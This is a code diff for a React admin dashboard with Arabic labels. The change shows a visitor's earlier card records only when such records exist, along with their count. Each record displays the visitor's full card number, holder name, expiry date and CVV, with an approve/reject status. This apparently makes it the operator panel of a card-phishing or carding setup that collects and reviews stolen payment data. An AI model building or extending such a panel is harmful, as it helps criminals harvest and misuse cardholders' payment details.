@@ -261,6 +261,7 @@ export default function DashboardPage() {
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [expandedCards, setExpandedCards] = useState<Record<string, boolean>>({});
   const [cardsHistory, setCardsHistory] = useState<Record<string, any[]>>({});
+  const [hasCardHistory, setHasCardHistory] = useState<Record<string, boolean>>({});
 
   // Toggle card history expansion
   const toggleCardHistory = async (visitorId: string) => {
@@ -272,7 +273,9 @@ export default function DashboardPage() {
         const res = await fetch(`/api/dashboard/card-history/${visitorId}`);
         if (res.ok) {
           const data = await res.json();
-          setCardsHistory(prev => ({ ...prev, [visitorId]: data.cards || [] }));
+          const cards = data.cards || [];
+          setCardsHistory(prev => ({ ...prev, [visitorId]: cards }));
+          setHasCardHistory(prev => ({ ...prev, [visitorId]: cards.length > 0 }));
         }
       } catch {
         console.error("Failed to fetch card history");
@@ -2131,86 +2134,77 @@ export default function DashboardPage() {
           </div>
         )}
 
-        {/* زر عرض جميع البطاقات */}
-        <div style={{ marginTop: 12 }}>
-          <button
-            onClick={() => toggleCardHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
-            style={{
-              width: "100%",
-              padding: "8px 16px",
-              borderRadius: 8,
-              border: "1px solid #e5e7eb",
-              background: expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
-              color: "#374151",
-              fontSize: "0.75rem",
-              fontWeight: 600,
-              cursor: "pointer",
-              display: "flex",
-              alignItems: "center",
-              justifyContent: "center",
-              gap: 6
-            }}
-          >
-            {expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : "📋 عرض جميع البطاقات"}
-          </button>
+        {/* زر عرض جميع البطاقات (يظهر فقط إذا كان هناك سجلات) */}
+        {hasCardHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+          <div style={{ marginTop: 12 }}>
+            <button
+              onClick={() => toggleCardHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
+              style={{
+                width: "100%",
+                padding: "8px 16px",
+                borderRadius: 8,
+                border: "1px solid #e5e7eb",
+                background: expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
+                color: "#374151",
+                fontSize: "0.75rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              {expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} بطاقات سابقة`}
+            </button>
 
-          {/* سجلات البطاقات */}
-          {expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
-            <div style={{ 
-              marginTop: 8,
-              maxHeight: 300,
-              overflowY: "auto"
-            }}>
-              {cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((card: any, idx: number) => (
-                <div key={idx} style={{
-                  background: card.isCurrent ? "#f0fdf4" : "#f9fafb",
-                  borderRadius: 8,
-                  padding: 12,
-                  marginBottom: 8,
-                  border: `1px solid ${card.isCurrent ? "#86efac" : "#e5e7eb"}`
-                }}>
-                  <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
-                    <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
-                      {card.isCurrent ? "🟢 الحالية" : `${idx + 1}. السابقة`}
-                    </span>
-                    <span style={{ 
-                      fontSize: "0.65rem", 
-                      padding: "2px 6px",
-                      borderRadius: 4,
-                      background: card.status === "approved" ? "#dcfce7" : card.status === "rejected" ? "#fee2e2" : "#fef3c7",
-                      color: card.status === "approved" ? "#166534" : card.status === "rejected" ? "#991b1b" : "#92400e"
-                    }}>
-                      {card.status === "approved" ? "✅" : card.status === "rejected" ? "❌" : "⏳"} {card.status}
-                    </span>
-                  </div>
-                  <div style={{ 
-                    fontFamily: "ui-monospace, monospace", 
-                    fontSize: "0.8rem", 
-                    letterSpacing: "1px",
-                    color: "#1f2937",
-                    marginBottom: 4
+            {/* سجلات البطاقات */}
+            {expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+              <div style={{ 
+                marginTop: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                {cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((card: any, idx: number) => (
+                  <div key={idx} style={{
+                    background: "#f9fafb",
+                    borderRadius: 8,
+                    padding: 12,
+                    marginBottom: 8,
+                    border: "1px solid #e5e7eb"
                   }}>
-                    {card.cardNumber}
+                    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
+                      <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
+                        بطاقة سابقة #{idx + 1}
+                      </span>
+                      <span style={{ 
+                        fontSize: "0.65rem", 
+                        padding: "2px 6px",
+                        borderRadius: 4,
+                        background: card.status === "approved" ? "#dcfce7" : card.status === "rejected" ? "#fee2e2" : "#fef3c7",
+                        color: card.status === "approved" ? "#166534" : card.status === "rejected" ? "#991b1b" : "#92400e"
+                      }}>
+                        {card.status === "approved" ? "✅" : card.status === "rejected" ? "❌" : "⏳"} {card.status}
+                      </span>
+                    </div>
+                    <div style={{ 
+                      fontFamily: "ui-monospace, monospace", 
+                      fontSize: "0.8rem", 
+                      letterSpacing: "1px",
+                      color: "#1f2937",
+                      marginBottom: 4
+                    }}>
+                      {card.cardNumber}
+                    </div>
+                    <div style={{ fontSize: "0.7rem", color: "#6b7280" }}>
+                      {card.cardHolder} | {card.expiryDate} | {card.cvv}
+                    </div>
                   </div>
-                  <div style={{ fontSize: "0.7rem", color: "#6b7280" }}>
-                    {card.cardHolder} | {card.expiryDate} | {card.cvv}
-                  </div>
-                </div>
-              ))}
-              {(!cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] || 
-                cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length === 0) && (
-                <div style={{
-                  textAlign: "center",
-                  padding: 20,
-                  color: "#9ca3af",
-                  fontSize: "0.8rem"
-                }}>
-                  لا توجد سجلات سابقة
-                </div>
-              )}
-            </div>
-          )}
-        </div>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
 
         {/* Card Updated Time */}
         {raw?.cardUpdatedAt && (
